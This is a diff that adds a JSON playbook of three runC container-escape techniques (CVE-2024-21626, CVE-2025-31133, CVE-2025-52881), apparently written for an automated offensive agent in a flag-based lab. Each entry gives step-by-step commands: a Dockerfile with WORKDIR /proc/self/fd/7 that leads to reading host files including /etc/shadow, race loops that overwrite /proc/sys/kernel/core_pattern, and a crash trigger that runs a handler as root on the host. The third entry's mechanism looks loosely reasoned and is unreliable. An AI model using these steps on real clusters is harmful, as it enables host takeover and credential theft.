@@ -1,0 +1,71 @@
+[
+  {
+    "id": "k8s-runc-workdir-container-escape",
+    "category": "ESCAPE",
+    "subcategory": "runC",
+    "title": "Kubernetes runC WORKDIR Container Escape (CVE-2024-21626) — Host FD Leak via /proc/self/fd",
+    "description": "CVE-2024-21626 affects runC versions < 1.1.12. During container creation, runC leaks a host-level file descriptor that is accessible inside the container at /proc/self/fd/7 (or a nearby fd number). By setting the container's WORKDIR to /proc/self/fd/7 (or similar fd path), the container's current working directory becomes the host filesystem root, bypassing all container isolation. Attack steps: (1) Build a custom Docker image with WORKDIR /proc/self/fd/7 in the Dockerfile. (2) Load the image into the KIND cluster. (3) Deploy a pod using this image. (4) Once the pod starts, the working directory is the host root filesystem. (5) Navigate and read host files: ls /, cat /host-flags/flag.txt. This is a complete container breakout — no special capabilities or privileges required, just the ability to deploy a pod with a custom image.",
+    "techniques": [
+      "Create Dockerfile: FROM alpine; WORKDIR /proc/self/fd/7",
+      "Build and load: docker build -t escape-runc . && kind load docker-image escape-runc --name CLUSTER_NAME",
+      "Deploy pod: kubectl run escape --image=escape-runc --restart=Never -- sleep 3600",
+      "Exec into pod: kubectl exec -it escape -- sh",
+      "Check CWD: pwd (should show host filesystem root)",
+      "Read host flag: cat /host-flags/flag.txt or cat /flag.txt",
+      "Access host filesystem: ls /etc/, cat /etc/shadow, etc.",
+      "The vulnerability is in the runC init process — it affects all container runtimes using vulnerable runC"
+    ],
+    "indicators": ["KIND or Docker-based K8s cluster", "Ability to deploy custom container images", "runC version < 1.1.12", "Pod with WORKDIR exploit image"],
+    "prerequisites": ["Access to Kubernetes cluster (kubectl)", "Ability to build and load custom Docker images", "Vulnerable runC version"],
+    "tools": ["kubectl_exec", "kubectl_run", "shell_exec"],
+    "tags": ["kubernetes", "runc", "container-escape", "cve-2024-21626", "workdir", "proc-fd", "host-filesystem", "kind"],
+    "confidence": 0.75,
+    "mitre_attack": "T1611"
+  },
+  {
+    "id": "k8s-runc-devnull-container-escape",
+    "category": "ESCAPE",
+    "subcategory": "runC",
+    "title": "Kubernetes runC /dev/null Symlink Escape (CVE-2025-31133) — core_pattern Overwrite via TOCTOU",
+    "description": "CVE-2025-31133 affects runC. The vulnerability is a TOCTOU (Time-of-Check-Time-of-Use) race condition in the creation of /dev/null inside containers. An attacker inside a container can replace /dev/null with a symbolic link to /proc/sys/kernel/core_pattern during the narrow window between /dev/null creation and its permission hardening. Once /proc/sys/kernel/core_pattern is writable, the attacker can set it to a pipe command (|/tmp/handler %p %s %e) that executes an attacker-controlled script whenever any process crashes. Since /proc/sys/kernel/core_pattern is a host-level setting, the handler executes as root on the HOST. Attack steps: (1) Run a continuous loop symlinking /dev/null to /proc/sys/kernel/core_pattern (race loop). (2) In parallel, repeatedly try to write to /proc/sys/kernel/core_pattern. (3) When the race succeeds, write '|/tmp/handler %p' to core_pattern. (4) Create /tmp/handler: #!/bin/sh; cat /host-flags/flag.txt > /tmp/flag_out (5) Crash any process (kill -SEGV $$) — kernel executes handler on host as root. (6) Read the output file.",
+    "techniques": [
+      "Create handler script: cat > /tmp/handler << 'EOF'\n#!/bin/sh\ncat /host-flags/flag.txt > /tmp/flag_out\nchmod 644 /tmp/flag_out\nEOF",
+      "chmod +x /tmp/handler",
+      "Race loop (symlink): while true; do ln -sf /proc/sys/kernel/core_pattern /dev/null 2>/dev/null; done &",
+      "Race loop (write): while true; do echo '|/tmp/handler %p %s %e' > /proc/sys/kernel/core_pattern 2>/dev/null && break; done",
+      "Kill race loops: kill %1 %2",
+      "Trigger crash: sh -c 'kill -SEGV $$'",
+      "Read output: cat /tmp/flag_out",
+      "The handler runs as root on the HOST node — full container escape"
+    ],
+    "indicators": ["Container with runC runtime", "Ability to run multiple processes in container (shell access)", "runC version vulnerable to CVE-2025-31133", "/proc/sys/kernel/core_pattern writable check"],
+    "prerequisites": ["Shell access inside K8s pod", "runC container runtime", "Ability to create files in /tmp"],
+    "tools": ["kubectl_exec", "shell_exec", "check_capabilities"],
+    "tags": ["kubernetes", "runc", "container-escape", "cve-2025-31133", "core-pattern", "toctou", "dev-null", "symlink"],
+    "confidence": 0.7,
+    "mitre_attack": "T1611"
+  },
+  {
+    "id": "k8s-runc-lsm-bypass-container-escape",
+    "category": "ESCAPE",
+    "subcategory": "runC",
+    "title": "Kubernetes runC LSM Bypass Escape (CVE-2025-52881) — Shared Mount TOCTOU Race",
+    "description": "CVE-2025-52881 affects runC. This is a TOCTOU race condition between the setup of shared bind mounts and the application of Linux Security Module (LSM) labels (AppArmor/SELinux). The race window exists because runC first sets up mounts and then applies LSM labels. An attacker can access the mount point after mount setup but before LSM labeling — bypassing the security policy. Once a mount is accessed without LSM restrictions, the attacker can write to protected paths like /proc/sys/kernel/core_pattern. Attack steps: (1) Set up a shared bind mount inside the container: 'mount --bind / /tmp/shared && mount --make-shared /tmp/shared'. (2) Run a loop that repeatedly tries to write to protected paths through the unlabeled mount. (3) When the race condition succeeds (LSM hasn't labeled the mount yet), write '|/tmp/handler %p' to core_pattern via the unlabeled path. (4) Create /tmp/handler script to exfiltrate host files. (5) Crash a process to trigger the handler execution as root on the host. This bypass requires CAP_SYS_ADMIN or similar mount capabilities in the container.",
+    "techniques": [
+      "Check capabilities: capsh --print | grep sys_admin",
+      "Set up shared mount: mount --bind / /tmp/shared; mount --make-shared /tmp/shared",
+      "Create handler: echo -e '#!/bin/sh\ncat /host-flags/flag.txt > /tmp/flag_out' > /tmp/handler; chmod +x /tmp/handler",
+      "Race write loop: while true; do echo '|/tmp/handler %p' > /tmp/shared/proc/sys/kernel/core_pattern 2>/dev/null && break; done",
+      "Check if write succeeded: cat /proc/sys/kernel/core_pattern (should show '|/tmp/handler %p')",
+      "Trigger crash: sh -c 'kill -SEGV $$'",
+      "Read output: cat /tmp/flag_out",
+      "Cleanup: umount /tmp/shared when done"
+    ],
+    "indicators": ["Container with runC and CAP_SYS_ADMIN", "AppArmor or SELinux enforcing", "Ability to perform bind mounts", "runC version vulnerable to CVE-2025-52881"],
+    "prerequisites": ["CAP_SYS_ADMIN in container", "Vulnerable runC version", "AppArmor/SELinux enabled on host", "Shell access in pod"],
+    "tools": ["kubectl_exec", "check_capabilities", "check_mounts", "shell_exec"],
+    "tags": ["kubernetes", "runc", "container-escape", "cve-2025-52881", "lsm-bypass", "apparmor", "selinux", "toctou", "core-pattern"],
+    "confidence": 0.65,
+    "mitre_attack": "T1611"
+  }
+]
